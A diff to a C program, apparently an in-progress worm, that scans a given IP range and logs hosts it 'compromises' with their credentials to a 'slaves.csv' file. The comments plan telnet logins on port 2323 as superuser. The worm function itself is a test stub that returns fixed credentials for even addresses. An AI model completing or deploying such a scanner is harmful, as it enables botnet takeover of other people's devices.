@@ -5,10 +5,14 @@
 #include <stdint.h>
 #include <arpa/inet.h>
 #include <string.h>
+#include <fcntl.h>
 
 //IP RANGE variable :  Little Endian form
 static uint32_t start_ip;
 static uint32_t end_ip;
+static char* ID;
+static char* PW;
+
 
 //Purpose : when wrong input argument is given.
 void showUsage(char *argv){
@@ -115,7 +119,17 @@ bool isValidInput(int argc, char *argv[]){
 }
 
 //ip given in Big ENDIAN
-int worm(uint32_t ip){
+bool worm(uint32_t ip){
+	//test purpose worm
+	if(ip%2==0){
+		ID=strdup("blaze");
+		PW=strdup("frost");			
+		return true;
+	}
+	else{
+		return false;
+	}
+
 //Connect to Specific IP with port number 2323
 
 //If connected try to login with superuser
@@ -133,15 +147,38 @@ int worm(uint32_t ip){
 }
 
 //iterate Worm function in IP range given by User
+//IP RANGE variable :  Little Endian form
 void iterateWorm(uint32_t start_ip,uint32_t end_ip){
 	uint32_t i;
-	for(i=start_ip;i<=end_ip;i++){
+	uint32_t bigEndian;
+	char* ptr;
+	struct sockaddr_in sa;
+	bool success=false;
+	const char* file="./slaves.csv";
+	FILE *fp=fopen(file,"w");
 
-		//test purpose printf
-		printf("IP %u\n",i);
-		printf("HTONL %u\n",htonl(i));
-		//worm(htonl(i));
+
+	//htonl -> worm
+	for(i=start_ip;i<=end_ip;i++){
+		bigEndian=htonl(i);
+		success=worm(bigEndian);
+
+		//in case of success record
+		if(success){
+			//Get string of IP Address
+			memset(&sa,0,sizeof(struct sockaddr_in));
+			sa.sin_addr.s_addr=bigEndian;
+			ptr=inet_ntoa(sa.sin_addr);
+
+			//write success result
+			fprintf(fp,"%s,",ptr);
+			fprintf(fp,"%s,",ID);
+			fprintf(fp,"%s\n",PW);
+
+		}
+		
 	}
+	fclose(fp);
 }
 
 
